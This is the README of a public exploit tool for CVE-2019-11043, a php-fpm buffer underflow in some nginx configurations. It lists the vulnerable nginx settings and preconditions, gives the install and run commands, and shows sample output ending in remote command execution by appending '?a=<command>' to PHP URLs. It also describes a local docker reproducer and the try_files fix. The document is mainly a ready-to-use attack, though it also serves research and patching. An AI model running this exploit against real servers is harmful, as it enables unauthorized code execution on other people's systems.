# PHuiP-FPizdaM

## What's this?

This is an exploit for a bug in php-fpm (CVE-2019-11043). In certain nginx + php-fpm configurations, the bug is possible to trigger from the outside. This means that a web user may get code execution if you have vulnerable config (see [below](#the-full-list-of-preconditions)).

## What's vulnerable

If a webserver runs nginx + php-fpm and nginx have a configuration like

```
location ~ [^/]\.php(/|$) {
  ...
  fastcgi_split_path_info ^(.+?\.php)(/.*)$;
  fastcgi_param PATH_INFO       $fastcgi_path_info;
  fastcgi_pass   php:9000;
  ...
}
```

which also lacks any script existence checks (like `try_files`), then you can probably hack it with this sploit.

#### The full list of preconditions
1. Nginx + php-fpm, `location ~ [^/]\.php(/|$)` must be forwarded to php-fpm (maybe the regexp can be stricter, see [#1](https://github.com/neex/phuip-fpizdam/issues/1)).
2. The `fastcgi_split_path_info` directive must be there and contain a regexp starting with `^` and ending with `$`, so we can break it with a newline character.
3. There must be a `PATH_INFO` variable assignment via statement `fastcgi_param PATH_INFO $fastcgi_path_info;`. Also `SCRIPT_FILENAME` must be set using `fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;` (there might be a constant path instead of `$document_root`). At first, we thought these are always present in the `fastcgi_params` file, but it's not true.
4. No file existence checks like `try_files $uri =404` or `if (-f $uri)`. If Nginx drops requests to non-existing scripts before FastCGI forwarding, our requests never reach php-fpm. Adding this is also the easiest way to patch.
5. This exploit works only for PHP 7+, but the bug itself is present in earlier versions (see [below](#about-php5)).

## Isn't this known to be vulnerable for years?

A long time ago php-fpm didn't restrict the extensions of the scripts, meaning that something like `/avatar.png/some-fake-shit.php` could execute `avatar.png` as a PHP script. This issue was fixed around 2010.

The current one doesn't require file upload, works in the most recent versions (until the fix has landed), and, most importantly, the exploit is much cooler.

## How to run

Install it using
```
go get github.com/neex/phuip-fpizdam
```

If you get strange compilation errors, make sure you're using go >= 1.13. Run the program using `phuip-fpizdam [url]` (assuming you have the `$GOPATH/bin` inside your `$PATH`, otherwise specify the full path to the binary). Good output looks like this:

```
2019/10/01 02:46:15 Base status code is 200
2019/10/01 02:46:15 Status code 500 for qsl=1745, adding as a candidate
2019/10/01 02:46:15 The target is probably vulnerable. Possible QSLs: [1735 1740 1745]
2019/10/01 02:46:16 Attack params found: --qsl 1735 --pisos 126 --skip-detect
2019/10/01 02:46:16 Trying to set "session.auto_start=0"...
2019/10/01 02:46:16 Detect() returned attack params: --qsl 1735 --pisos 126 --skip-detect <-- REMEMBER THIS
2019/10/01 02:46:16 Performing attack using php.ini settings...
2019/10/01 02:46:40 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2019/10/01 02:46:40 Trying to cleanup /tmp/a...
2019/10/01 02:46:40 Done!
```

After this, you can start appending `?a=<your command>` to all PHP scripts (you may need multiple retries).

## Playground environment

If you want to reproduce the issue or play with the exploit locally, do the following:

1. Clone this repo and go to the `reproducer` directory.
2. Create the docker image using `docker build -t reproduce-cve-2019-11043 .`. It takes a long time as it internally clones the php repository and builds it from the source. However, it will be easier this way if you want to debug the exploit. The revision built is the one right before the fix.
2. Run the docker using `docker run --rm -ti -p 8080:80 reproduce-cve-2019-11043`.
3. Now you have http://127.0.0.1:8080/script.php, which is an empty file.
4. Run the exploit using `phuip-fpizdam http://127.0.0.1:8080/script.php`
5. If everything is ok, you'll be able to execute commands by appending `?a=` to the script: http://127.0.0.1:8080/script.php?a=id. Try multiple times as only some of php-fpm workers are infected.

## About PHP5

The buffer underflow in php-fpm is present in PHP version 5. However, this exploit makes use of an optimization used for storing FastCGI variables, [_fcgi_data_seg](https://github.com/php/php-src/blob/5d6e923/main/fastcgi.c#L186). This optimization is present only in php 7, so this particular exploit works only for php 7. There might be another exploitation technique that works in php 5.

## Credits

Original anomaly discovered by [d90pwn](https://twitter.com/d90pwn) during Real World CTF. Root clause found by me (Emil Lerner) as well as the way to set php.ini options. Final php.ini options set is found by [beched](https://twitter.com/ahack_ru).
